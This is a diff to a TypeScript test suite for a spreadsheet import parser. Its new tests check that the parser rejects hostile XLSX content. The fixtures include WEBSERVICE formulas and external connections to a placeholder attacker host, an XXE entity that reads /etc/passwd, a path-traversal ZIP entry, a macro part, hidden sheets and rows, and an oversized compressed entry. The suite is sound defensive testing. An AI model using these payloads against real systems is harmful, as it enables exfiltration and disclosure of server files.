@@ -6,11 +6,15 @@ import {
   buildMappedImportCsv,
   filterMappingForHeaders,
   parseXlsxWorkbook,
+  readImportFile,
 } from "./import-spreadsheet-file"
 
 const encoder = new TextEncoder()
 
-function littleEndian(size: number, values: Array<[number, number, number]>): Uint8Array {
+function littleEndian(
+  size: number,
+  values: Array<[number, number, number]>,
+): Uint8Array {
   const bytes = new Uint8Array(size)
   const view = new DataView(bytes.buffer)
   for (const [offset, value, width] of values) {
@@ -66,7 +70,8 @@ function storedZip(files: Record<string, string>): ArrayBuffer {
       [42, localOffset, 4],
     ])
     centralParts.push(centralHeader, nameBytes)
-    localOffset += localHeader.byteLength + nameBytes.byteLength + data.byteLength
+    localOffset +=
+      localHeader.byteLength + nameBytes.byteLength + data.byteLength
   }
 
   const central = concat(centralParts)
@@ -81,7 +86,11 @@ function storedZip(files: Record<string, string>): ArrayBuffer {
   return toArrayBuffer(zip)
 }
 
-function compressedZip(name: string, text: string, declaredSize: number): ArrayBuffer {
+function compressedZip(
+  name: string,
+  text: string,
+  declaredSize: number,
+): ArrayBuffer {
   const nameBytes = encoder.encode(name)
   const compressed = new Uint8Array(deflateRawSync(encoder.encode(text)))
   const localHeader = littleEndian(30, [
@@ -120,7 +129,7 @@ test("opens the first worksheet, resolves shared strings, and normalizes dates",
     "xl/workbook.xml":
       '<workbook><sheets><sheet name="Opening balances" sheetId="1"/></sheets></workbook>',
     "xl/sharedStrings.xml":
-      '<sst><si><t>Account</t></si><si><t>Date</t></si><si><t>Cash</t></si></sst>',
+      "<sst><si><t>Account</t></si><si><t>Date</t></si><si><t>Cash</t></si></sst>",
     "xl/styles.xml":
       '<styleSheet><cellXfs count="2"><xf numFmtId="0"/><xf numFmtId="14"/></cellXfs></styleSheet>',
     "xl/worksheets/sheet1.xml": [
@@ -142,12 +151,17 @@ test("opens the first worksheet, resolves shared strings, and normalizes dates",
 
 test("rejects a file without worksheets", async () => {
   const workbook = storedZip({ "xl/workbook.xml": "<workbook/>" })
-  await assert.rejects(() => parseXlsxWorkbook(workbook), /does not contain a worksheet/)
+  await assert.rejects(
+    () => parseXlsxWorkbook(workbook),
+    /does not contain a worksheet/,
+  )
 })
 
 test("rejects a ZIP entry whose local header points outside the workbook", async () => {
   const workbook = new Uint8Array(
-    storedZip({ "xl/worksheets/sheet1.xml": "<worksheet><sheetData/></worksheet>" }),
+    storedZip({
+      "xl/worksheets/sheet1.xml": "<worksheet><sheetData/></worksheet>",
+    }),
   )
   const view = new DataView(workbook.buffer)
   let centralOffset = -1
@@ -207,7 +221,11 @@ test("rejects reordered multi-sheet workbooks instead of reading the wrong sheet
 test("saved mappings only carry columns that exist in the new file", () => {
   assert.deepEqual(
     filterMappingForHeaders(
-      { Account: "account_code", Amount: "debit", "Old column": "metadata.extra.old" },
+      {
+        Account: "account_code",
+        Amount: "debit",
+        "Old column": "metadata.extra.old",
+      },
       ["Account", "Amount"],
     ),
     { Account: "account_code", Amount: "debit" },
@@ -232,4 +250,232 @@ test("builds canonical import CSV from the reviewed mapping and skipped duplicat
     ),
     "account_code,debit\n1000,25.00",
   )
+})
+
+const basicSheet =
+  '<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row><row r="2"><c r="A2" t="inlineStr"><is><t>Acme</t></is></c></row></sheetData></worksheet>'
+
+test("rejects formula cells instead of trusting their cached result", async () => {
+  const workbook = storedZip({
+    "xl/worksheets/sheet1.xml": basicSheet.replace(
+      "<is><t>Acme</t></is>",
+      '<f>WEBSERVICE("https://attacker.invalid")</f><v>Acme</v>',
+    ),
+  })
+  await assert.rejects(
+    () => parseXlsxWorkbook(workbook),
+    /formulas are not supported/,
+  )
+})
+
+test("rejects unsafe parts, duplicate names, external relationships and XML declarations", async () => {
+  const hostileParts: Array<Record<string, string>> = [
+    { "../escape.xml": "<x/>" },
+    { "xl/vbaProject.bin": "executable" },
+    { "xl/comments1.xml": "<comments/>" },
+    { "XL/WORKSHEETS/SHEET1.XML": "<worksheet/>" },
+    {
+      "xl/_rels/workbook.xml.rels":
+        '<Relationships><Relationship TargetMode = "External" Target="https://attacker.invalid"/></Relationships>',
+    },
+    {
+      "docProps/core.xml":
+        '<!DOCTYPE x [<!ENTITY steal SYSTEM "file:///etc/passwd">]><x>&steal;</x>',
+    },
+    {
+      "xl/workbook.xml":
+        '<workbook><sheets><sheet name="Hidden" state="veryHidden" sheetId="1"/></sheets></workbook>',
+    },
+  ]
+  for (const parts of hostileParts) {
+    await assert.rejects(() =>
+      parseXlsxWorkbook(
+        storedZip({ "xl/worksheets/sheet1.xml": basicSheet, ...parts }),
+      ),
+    )
+  }
+})
+
+test("rejects hidden rows and duplicate coordinates instead of importing concealed or overwritten data", async () => {
+  for (const xml of [
+    basicSheet.replace('<row r="2">', '<row r="2" hidden="1">'),
+    basicSheet.replace(
+      "</row></sheetData>",
+      '<c r="A2"><v>9</v></c></row></sheetData>',
+    ),
+  ]) {
+    await assert.rejects(
+      () => parseXlsxWorkbook(storedZip({ "xl/worksheets/sheet1.xml": xml })),
+      /Hidden|duplicate cell/,
+    )
+  }
+})
+
+test("rejects encrypted ZIP entries and implausible aggregate expansion before XML parsing", async () => {
+  const encrypted = storedZip({ "xl/worksheets/sheet1.xml": basicSheet })
+  const view = new DataView(encrypted)
+  view.setUint16(6, 1, true)
+  for (let offset = 0; offset < encrypted.byteLength - 46; offset += 1) {
+    if (view.getUint32(offset, true) === 0x02014b50)
+      view.setUint16(offset + 8, 1, true)
+  }
+  await assert.rejects(() => parseXlsxWorkbook(encrypted), /Encrypted/)
+  await assert.rejects(
+    () =>
+      parseXlsxWorkbook(
+        compressedZip("xl/worksheets/sheet1.xml", basicSheet, 30_000_001),
+      ),
+    /safe import limit/,
+  )
+})
+
+test("readImportFile sends original bytes for server admission and retains immutable provenance", async () => {
+  const file = new File(["name\nAcme"], "original.csv")
+  const originalFetch = globalThis.fetch
+  try {
+    globalThis.fetch = async (url, init) => {
+      assert.equal(url, "/api/import/inspect-file")
+      assert.equal(init?.body, file)
+      assert.equal(init?.credentials, "same-origin")
+      assert.equal(
+        (init?.headers as Record<string, string>)["x-file-name"],
+        "original.csv",
+      )
+      return Response.json({
+        csvText: "name\nAcme",
+        headers: ["name"],
+        rows: [["Acme"]],
+        format: "csv",
+        policyVersion: "file-admission-v1",
+        sourceSha256: "a".repeat(64),
+      })
+    }
+    const parsed = await readImportFile(file)
+    assert.equal(parsed.sourceSha256, "a".repeat(64))
+    assert.equal(parsed.policyVersion, "file-admission-v1")
+  } finally {
+    globalThis.fetch = originalFetch
+  }
+})
+
+test("failed server admission never falls back to local extraction", async () => {
+  const originalFetch = globalThis.fetch
+  try {
+    globalThis.fetch = async () =>
+      Response.json({ error: "Workbook rejected" }, { status: 422 })
+    await assert.rejects(
+      () => readImportFile(new File(["name\nAcme"], "file.csv")),
+      /Workbook rejected/,
+    )
+    globalThis.fetch = async () =>
+      Response.json({
+        csvText: "name\nOther",
+        headers: ["name"],
+        rows: [["Acme"]],
+        format: "csv",
+        policyVersion: "v1",
+        sourceSha256: "a".repeat(64),
+      })
+    await assert.rejects(
+      () => readImportFile(new File(["name\nAcme"], "file.csv")),
+      /inconsistent normalized data/,
+    )
+  } finally {
+    globalThis.fetch = originalFetch
+  }
+})
+
+test("workbook source admissions are retained and malformed or missing handles reject", async () => {
+  const originalFetch = globalThis.fetch
+  const base = {
+    csvText: "name\nAcme",
+    headers: ["name"],
+    rows: [["Acme"]],
+    format: "xlsx",
+    sheetName: null,
+    policyVersion: "file-admission-v1",
+    sourceSha256: "a".repeat(64),
+  }
+  try {
+    globalThis.fetch = async () =>
+      Response.json({ ...base, sourceAdmissionId: "b".repeat(32) })
+    assert.equal(
+      (await readImportFile(new File(["zip"], "source.xlsx")))
+        .sourceAdmissionId,
+      "b".repeat(32),
+    )
+    for (const id of [undefined, "not-clean", "A".repeat(32)]) {
+      globalThis.fetch = async () =>
+        Response.json({ ...base, ...(id ? { sourceAdmissionId: id } : {}) })
+      await assert.rejects(
+        () => readImportFile(new File(["zip"], "source.xlsx")),
+        /invalid result/,
+      )
+    }
+  } finally {
+    globalThis.fetch = originalFetch
+  }
+})
+
+test("rejects refresh connections, defined-name formulas and worksheet extension cells", async () => {
+  for (const parts of [
+    {
+      "xl/connections.xml":
+        '<connections><connection refreshOnLoad="1"><webPr url="https://attacker.invalid"/></connection></connections>',
+    },
+    {
+      "xl/workbook.xml":
+        '<workbook><definedNames><definedName name="Payload">WEBSERVICE("https://attacker.invalid")</definedName></definedNames></workbook>',
+    },
+    {
+      "xl/worksheets/sheet1.xml": basicSheet.replace(
+        "</worksheet>",
+        '<extLst><ext><c r="A3"><v>hidden</v></c></ext></extLst></worksheet>',
+      ),
+    },
+    {
+      "xl/worksheets/sheet1.xml": basicSheet.replace(
+        "<worksheet>",
+        '<worksheet xmlns="urn:foreign">',
+      ),
+    },
+  ] as Array<Record<string, string>>) {
+    await assert.rejects(() =>
+      parseXlsxWorkbook(
+        storedZip({ "xl/worksheets/sheet1.xml": basicSheet, ...parts }),
+      ),
+    )
+  }
+})
+
+test("original admission uses the explicitly selected company and rejects a mismatched result", async () => {
+  const originalFetch = globalThis.fetch
+  const base = {
+    csvText: "name\nAcme",
+    headers: ["name"],
+    rows: [["Acme"]],
+    format: "csv",
+    policyVersion: "file-admission-v1",
+    sourceSha256: "a".repeat(64),
+    sourceAdmissionId: "b".repeat(32),
+  }
+  try {
+    globalThis.fetch = async (path) => {
+      assert.equal(path, "/api/import/inspect-file?companyId=9007199254740993")
+      return Response.json({ ...base, companyId: "9007199254740993" })
+    }
+    await readImportFile(new File(["name\nAcme"], "source.csv"), {
+      companyId: 9007199254740993n,
+    })
+    globalThis.fetch = async () => Response.json({ ...base, companyId: "1" })
+    await assert.rejects(
+      () =>
+        readImportFile(new File(["name\nAcme"], "source.csv"), {
+          companyId: 2,
+        }),
+      /invalid result/,
+    )
+  } finally {
+    globalThis.fetch = originalFetch
+  }
 })
